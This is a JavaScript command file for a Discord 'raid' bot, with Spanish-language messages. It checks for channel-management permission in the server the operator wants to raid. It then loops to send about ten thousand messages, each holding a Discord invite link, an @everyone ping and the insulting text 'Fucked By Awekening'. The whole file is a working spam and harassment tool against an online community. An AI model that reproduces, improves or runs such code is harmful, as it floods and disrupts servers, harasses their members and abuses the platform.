let invite = "https://discord.gg/guzP8dbDvN"

module.exports = {
    nombre: "send",
    alias: ["rp"],
    run: (client, message, args) => {

        if(!message.guild.me.hasPermission("MANAGE_CHANNELS")) return message.author.send(":x: `|` No tengo permiso de borrar/crear canales en el servidor que quieres r4idear")

        if(!args[0]) return message.channel.send(":x: `|` Pon la id del canal")



        function dead(){
            for(let i = 0; i < 1000; i++){
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
                message.channel.send( invite +"\n\n\n\n@everyone Fucked By Awekening").catch((err) => {
                    console.log(err)
                })
            }
        }

        client.channels.cache.get(args[0]).send(dead()).catch((err) => {
            console.log(err)
        })


    }
}